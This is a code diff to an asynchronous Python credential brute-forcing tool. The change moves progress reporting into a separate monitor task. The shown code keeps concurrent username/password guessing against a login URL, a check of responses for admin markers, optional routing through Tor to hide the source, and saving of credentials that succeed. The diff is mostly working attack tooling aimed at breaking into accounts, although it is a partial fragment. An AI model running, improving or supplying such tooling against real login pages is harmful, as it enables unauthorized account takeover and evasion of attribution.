@@ -408,19 +408,11 @@ async def save_successful_login(username, password):
 # ==================================================================================================
 # ==================================================================================================
 
-async def brute_force_task(
-    url,
-    username,
-    password,
-    session,
-    total_attempts,
-    start_time,
-    progress_print_interval,
-):
+async def brute_force_task(url, username, password, session):
+    """Function attempts brute_force_login and logs successful results"""
     response_text, response_time, response_status = await brute_force_login(
         url, username, password, session
     )
-    total_attempts[0] += 1
     # Not sure if Dashboard actually is a valid match, but trusting pre-existing
     # check which might work with older versions
     good_matches = ['isAdmin', 'Dashboard']
@@ -429,19 +421,32 @@ async def brute_force_task(
         await save_successful_login(username, password)
         return True
 
-    if time.time() - start_time[0] > progress_print_interval:
-        elapsed_time = time.time() - start_time[0]
-        minutes, seconds = divmod(int(elapsed_time), 60)
-        attempts_per_second = total_attempts[0] / (
-            elapsed_time if elapsed_time > 0 else 1
-        )
-        print(
-            f"\r{Fore.CYAN}Passwords Checked: {total_attempts[0]} | Elapsed: {minutes:02}:{seconds:02} | Attempts/second: {attempts_per_second:.2f}",
-            end="",
-        )
-        start_time[0] = time.time()
-
     return False
+
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
+
+async def progress_print(tasks: list[asyncio.Task], interval: float=1.0):
+    """Print progress while brute force attempts are executing"""
+    total = len(tasks)
+    start = time.perf_counter()
+    while True:
+        done = sum(1 for t in tasks if t.done())
+        complete = sum(1 for t in tasks if t.done() and not t.cancelled() and t.exception() is None)
+        exceptions = sum(1 for t in tasks if t.done() and t.exception() is not None)
+        exceptions_str = f"{Fore.RED}{exceptions}{Fore.CYAN}" if exceptions > 0 else f"{exceptions}"
+        elapsed = time.perf_counter() - start
+        minutes, seconds = divmod(int(elapsed), 60)
+        attempts_per_second = int(done / elapsed) if elapsed > 0 else 0
+        print(
+            f"\r{Fore.CYAN}Username/Password Combinations Checked: {done}/{total} "
+            f"(Complete|Exceptions: {complete}|{exceptions_str}) | "
+            f"Elapsed: {minutes:02}:{seconds:02} | Attempts/second: {attempts_per_second}",
+            end='')
+        if done >= total:
+            break
+        await asyncio.sleep(interval)
 
 # ==================================================================================================
 # ==================================================================================================
@@ -449,10 +454,6 @@ async def brute_force_task(
 
 async def start_bruteforce_async(url, usernames, passwords, use_tor=False):
     """Build the asyncio task list of brute_force_tasks and then run them"""
-    # Initialize start time and total attempts
-    start_time = [time.time()]  # List to hold the start time for tracking elapsed time
-    total_attempts = [0]  # List to hold the total number of attempts made
-    progress_print_interval = 0.5  # Time interval in seconds for printing progress reports
 
     # Set up the proxy connector if using Tor
     if use_tor:
@@ -470,6 +471,8 @@ async def start_bruteforce_async(url, usernames, passwords, use_tor=False):
     # Create an aiohttp session with the connector
     async with aiohttp.ClientSession(connector=connector) as session:
         tasks = []  # List to hold all the asyncio tasks
+
+        monitor = asyncio.create_task(progress_print(tasks))
         # Create brute force tasks for each username and password combination
         for username in usernames:
             for password in passwords:
@@ -479,16 +482,16 @@ async def start_bruteforce_async(url, usernames, passwords, use_tor=False):
                         url,
                         username,
                         password,
-                        session,
-                        total_attempts,
-                        start_time,
-                        progress_print_interval,
+                        session
                     )
                 )
                 tasks.append(task)  # Add the task to the list
 
-        # Run all tasks concurrently
-        await asyncio.gather(*tasks)  # Wait for all tasks to complete
+        try:
+            # Run all tasks concurrently
+            await asyncio.gather(*tasks, return_exceptions=True)  # Wait for all tasks to complete
+        finally:
+            await monitor
 
 # ==================================================================================================
 # ==================================================================================================
